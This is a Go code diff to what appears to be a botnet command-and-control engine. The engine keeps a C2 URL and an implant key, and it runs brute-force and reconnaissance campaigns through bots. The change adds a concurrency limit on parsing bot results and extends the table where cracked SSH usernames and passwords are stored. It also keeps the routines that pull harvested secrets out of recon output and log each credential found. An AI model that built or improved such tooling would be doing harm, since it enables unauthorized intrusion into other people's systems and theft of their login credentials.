@@ -27,6 +27,7 @@ type Engine struct {
 	implantKey string
 	campLocks  sync.Map
 	deploySem  chan struct{}
+	parseSem   chan struct{}
 	policy     policy.Policy
 }
 
@@ -40,6 +41,7 @@ func NewWithPolicy(db *database.DB, c2URL, implantKey string, p policy.Policy) *
 		c2URL:      c2URL,
 		implantKey: implantKey,
 		deploySem:  make(chan struct{}, 5),
+		parseSem:   make(chan struct{}, 10),
 		policy:     p,
 	}
 }
@@ -257,10 +259,18 @@ func (e *Engine) syncResults(campID, campType string) {
 			r.status, r.output, now, r.taskID)
 
 		if campType == models.CampaignTypeBrute && r.status == models.StatusCompleted {
-			go e.parseBruteResults(campID, r.botID, r.output)
+			go func(cID, bID, out string) {
+				e.parseSem <- struct{}{}
+				defer func() { <-e.parseSem }()
+				e.parseBruteResults(cID, bID, out)
+			}(campID, r.botID, r.output)
 		}
-		if campType == models.CampaignTypeRecon && (r.status == models.StatusCompleted || r.status == models.StatusFailed) && r.output != "" {
-			go e.parseReconSecrets(campID, r.botID, r.output)
+		if campType == models.CampaignTypeRecon && r.status == models.StatusCompleted && r.output != "" {
+			go func(cID, bID, out string) {
+				e.parseSem <- struct{}{}
+				defer func() { <-e.parseSem }()
+				e.parseReconSecrets(cID, bID, out)
+			}(campID, r.botID, r.output)
 		}
 	}
 }
@@ -296,9 +306,9 @@ func (e *Engine) parseBruteResults(campID, botID, output string) {
 		password := rest[firstColon+1:]
 
 		e.db.Exec(`
-			INSERT INTO credentials (username, password, target, port, service, valid)
-			VALUES ($1, $2, $3, $4, 'ssh', true)
-			ON CONFLICT DO NOTHING`,
+			INSERT INTO credentials (username, password, target, port, service, category, valid)
+			VALUES ($1, $2, $3, $4, 'ssh', 'login', true)
+			ON CONFLICT (username, target, port, service, category) DO NOTHING`,
 			username, password, target, port)
 		log.Printf("[+] Campaign %s: credential found %s@%s:%s", campID[:8], username, target, port)
 
